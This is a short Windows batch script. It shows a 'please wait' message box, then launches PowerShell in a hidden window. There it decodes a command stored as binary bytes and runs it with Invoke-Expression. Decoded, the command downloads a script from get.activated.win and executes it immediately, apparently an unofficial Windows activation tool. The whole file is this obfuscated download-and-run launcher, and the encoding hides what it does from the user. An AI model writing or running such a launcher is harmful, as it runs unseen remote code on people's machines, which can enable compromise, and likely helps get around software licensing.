@echo off
:: DON'T CHANGE/EDIT THIS CODE!!!

powershell -NoProfile -Command "& {Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Press OK to continue & please wait ...', 'Modified by Muhammad Rizki (reztdev)', 'OK', 'Information')}"

powershell -NoProfile -WindowStyle Hidden -Command "& {function CustomDecodeFromBinary {param ([string]$EncodedBinary) $binaryBytes = $EncodedBinary -split ' '; $decodedBytes = $binaryBytes | ForEach-Object { [Convert]::ToByte($_, 2) }; [System.Text.Encoding]::UTF8.GetString($decodedBytes)}; $encodedBinary = '1101001 1110010 1101101 100000 1101000 1110100 1110100 1110000 1110011 111010 101111 101111 1100111 1100101 1110100 101110 1100001 1100011 1110100 1101001 1110110 1100001 1110100 1100101 1100100 101110 1110111 1101001 1101110 100000 1111100 100000 1101001 1100101 1111000'; $decodedCommand = CustomDecodeFromBinary -EncodedBinary $encodedBinary; Invoke-Expression $decodedCommand;}"
